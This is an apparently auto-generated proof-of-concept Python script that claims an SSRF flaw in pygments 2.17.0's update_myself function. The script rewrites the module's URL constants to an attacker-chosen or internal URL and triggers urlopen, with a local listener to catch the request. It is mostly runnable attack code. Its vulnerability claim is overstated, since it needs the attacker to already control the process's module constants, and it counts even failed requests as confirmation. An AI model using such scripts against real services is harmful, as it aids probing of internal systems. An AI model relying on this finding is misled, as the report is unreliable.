#!/usr/bin/env python3
# PoC for pygments-2.17.0 (/tmp/pygments_test2/pygments-2.17.0)
# Path: ssrf-004
# Sink: update_myself
# Auto-generated — run with: python3 ssrf_urls_datatypes_url_keywords_update_myself.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via pygments _postgres_builtins.update_myself

This script demonstrates how an attacker who can control the DATATYPES_URL or
KEYWORDS_URL constants (e.g., via environment variables, configuration injection,
or monkey-patching) can force pygments to make an HTTP request to an arbitrary
URL. The PoC sets up a local HTTP server to receive the request, proving SSRF.

Vulnerability: pygments-2.17.0 /pygments/lexers/_postgres_builtins.py
  - update_myself() calls urlopen(DATATYPES_URL) and urlopen(KEYWORDS_URL)
  - These constants are defined in the same file and are not validated
  - If an attacker can modify them, they can control the URL (SSRF)

Usage:
    python3 poc_ssrf_pygments.py [--target-url http://attacker-controlled.com]

    By default, starts a local listener on 127.0.0.1:9999 to demonstrate the SSRF.
    Use --target-url to specify a different URL (e.g., internal service).
"""

import argparse
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.error import URLError, HTTPError

# We need to import the vulnerable module to trigger the SSRF
# The constants DATATYPES_URL and KEYWORDS_URL are defined in this module
from pygments.lexers._postgres_builtins import (
    update_myself,
    DATATYPES_URL,
    KEYWORDS_URL,
)


class SSRFHandler(BaseHTTPRequestHandler):
    """Simple HTTP handler to log incoming requests (proof of SSRF)."""

    def do_GET(self):
        print(f"[+] SSRF DETECTED! Received request for: {self.path}")
        print(f"[+] Headers: {self.headers}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        # Suppress default logging to keep output clean
        pass


def start_listener(host="127.0.0.1", port=9999):
    """Start a local HTTP server to receive the SSRF request."""
    server = HTTPServer((host, port), SSRFHandler)
    print(f"[*] Listening on {host}:{port} for SSRF request...")
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via pygments _postgres_builtins.update_myself"
    )
    parser.add_argument(
        "--target-url",
        default="http://127.0.0.1:9999/ssrf_test",
        help="URL to use as DATATYPES_URL (default: local listener)",
    )
    args = parser.parse_args()

    # Start local listener if using default target
    server = None
    if "127.0.0.1" in args.target_url or "localhost" in args.target_url:
        server = start_listener()
        time.sleep(0.5)  # Give server time to start

    print(f"[*] Attempting SSRF to: {args.target_url}")

    # Override the DATATYPES_URL constant to point to attacker-controlled URL
    # In a real attack, this could be done via environment variable injection,
    # configuration file modification, or monkey-patching.
    import pygments.lexers._postgres_builtins as pg_builtins

    original_datatypes_url = pg_builtins.DATATYPES_URL
    original_keywords_url = pg_builtins.KEYWORDS_URL

    try:
        # Set the malicious URL
        pg_builtins.DATATYPES_URL = args.target_url
        pg_builtins.KEYWORDS_URL = args.target_url  # Also set keywords for demo

        # Trigger the vulnerable function
        # This will call urlopen(DATATYPES_URL) and urlopen(KEYWORDS_URL)
        update_myself()

        print("[+] update_myself completed (no exception = request was made)")
        print("[+] Check the listener output above for the SSRF request.")

    except HTTPError as e:
        print(f"[!] HTTP error occurred: {e.code} - {e.reason}")
        print("[+] This still confirms the SSRF (request was made, got error response)")
    except URLError as e:
        print(f"[!] URL error: {e.reason}")
        print("[+] This still confirms the SSRF (request was attempted)")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        print("[+] The SSRF may have partially succeeded (check listener)")
    finally:
        # Restore original constants (good practice)
        pg_builtins.DATATYPES_URL = original_datatypes_url
        pg_builtins.KEYWORDS_URL = original_keywords_url

        if server:
            print("[*] Shutting down listener...")
            server.shutdown()

    print("\n[*] PoC complete. If you saw 'SSRF DETECTED' above, the vulnerability is confirmed.")


if __name__ == "__main__":
    main()
